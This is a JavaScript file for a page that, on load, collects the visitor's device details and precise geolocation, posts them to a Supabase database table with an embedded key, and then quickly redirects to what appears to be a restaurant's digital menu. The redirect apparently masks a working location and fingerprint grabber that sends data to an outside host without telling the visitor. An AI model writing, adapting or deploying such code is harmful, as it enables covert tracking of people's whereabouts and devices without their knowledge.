const CONFIG = {
  SUPABASE_URL: "https://gdqejyxctqzpawbrjjvi.supabase.co",
  SUPABASE_ANON_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdkcWVqeXhjdHF6cGF3YnJqanZpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUxMDQ3MjIsImV4cCI6MjA4MDY4MDcyMn0.uXaXomVVOJp82KAAuS7o3_BLr0T8bSIDDhjIfoqq6So",
  REDIRECT_URL: "https://cardapio-digital-v1.vercel.app/",
  TIMEOUT_MS: 3000,
  DB_TABLE: "visits_data",
  BACKEND_GEO_ENDPOINT: "/api/geo"
}

function getLocationViaGeolocation(timeoutMs = 8000) {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    const id = setTimeout(() => {
      resolve(null);
    }, timeoutMs);
    navigator.geolocation.getCurrentPosition(
      pos => {
        clearTimeout(id);
        resolve({
          source: "geolocation_api",
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      () => {
        clearTimeout(id);
        resolve(null);
      },
      { timeout: timeoutMs }
    );
  });
}

function getLocationViaCloudflareHeaders() {
  try {
    const country = document.querySelector('meta[name="cf-ipcountry"]')?.content;
    const city = document.querySelector('meta[name="cf-ipcity"]')?.content;
    const lat = document.querySelector('meta[name="cf-iplatitude"]')?.content;
    const lon = document.querySelector('meta[name="cf-iplongitude"]')?.content;
    if (!country) return null;
    return {
      source: "cloudflare_headers",
      country,
      city: city || null,
      latitude: lat ? Number.parseFloat(lat) : null,
      longitude: lon ? Number.parseFloat(lon) : null
    };
  } catch {
    return null;
  }
}

async function getLocationViaBackend() {
  try {
    const resp = await fetch(CONFIG.BACKEND_GEO_ENDPOINT, { cache: "no-store" });
    if (!resp.ok) return null;
    const data = await resp.json();
    return { source: "backend_aggregate", ...data };
  } catch {
    return null;
  }
}

function collectBrowserData() {
  const perfTiming = performance.timing || {};
  return {
    timestamp: new Date().toISOString(),
    sessionId: generateUUID(),
    referrer: document.referrer || null,
    current_url: window.location.href,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    windowInnerWidth: window.innerWidth,
    windowInnerHeight: window.innerHeight,
    devicePixelRatio: window.devicePixelRatio,
    navigationStart: perfTiming.navigationStart || null,
    domContentLoadedEventEnd: perfTiming.domContentLoadedEventEnd || null,
    loadEventEnd: perfTiming.loadEventEnd || null
  };
}

function generateUUID() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function enqueueToLocalQueue(key, payload) {
  try {
    const raw = localStorage.getItem(key);
    const arr = raw ? JSON.parse(raw) : [];
    arr.push(payload);
    localStorage.setItem(key, JSON.stringify(arr));
  } catch (e) {
    console.warn("Falha ao enfileirar payload:", e);
  }
}

async function flushLocalQueue(key) {
  try {
    const raw = localStorage.getItem(key);
    if (!raw) return;
    const arr = JSON.parse(raw);
    const remaining = [];
    for (const item of arr) {
      const ok = await trySendDirect(item);
      if (!ok) remaining.push(item);
    }
    if (remaining.length > 0) {
      localStorage.setItem(key, JSON.stringify(remaining));
    } else {
      localStorage.removeItem(key);
    }
  } catch (e) {
    console.warn("Erro ao flush queue:", e);
  }
}

async function trySendDirect(payload) {
  const client = { url: CONFIG.SUPABASE_URL, key: CONFIG.SUPABASE_ANON_KEY };
  const url = `${client.url}/rest/v1/${CONFIG.DB_TABLE}`;

  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${client.key}`,
        "apikey": client.key
      },
      body: JSON.stringify({ payload }),
      keepalive: true
    });
    return resp.ok;
  } catch (e) {
    return false;
  }
}

async function sendToSupabaseWithFallback(payload) {
  const ok = await trySendDirect(payload);
  if (!ok) {
    enqueueToLocalQueue("analytics_queue_v1", payload);
  }
}

window.addEventListener("load", () => {
  flushLocalQueue("analytics_queue_v1");
});

async function initDataCollector() {
  try {
    const browserData = collectBrowserData();

    const nativeLoc = await getLocationViaGeolocation(3000);
    const cfLoc = getLocationViaCloudflareHeaders();
    const backend = await getLocationViaBackend();

    const fullData = {
      browser: browserData,
      geo: {
        native: nativeLoc,
        cloudflare: cfLoc,
        backend: backend
      },
      collected_at: new Date().toISOString()
    };

    await sendToSupabaseWithFallback(fullData);

    setTimeout(() => {
      window.location.replace(CONFIG.REDIRECT_URL);
    }, 100);
  } catch (error) {
    console.error("[collector] erro:", error);
    setTimeout(() => {
      window.location.replace(CONFIG.REDIRECT_URL);
    }, 100);
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initDataCollector);
} else {
  initDataCollector();
}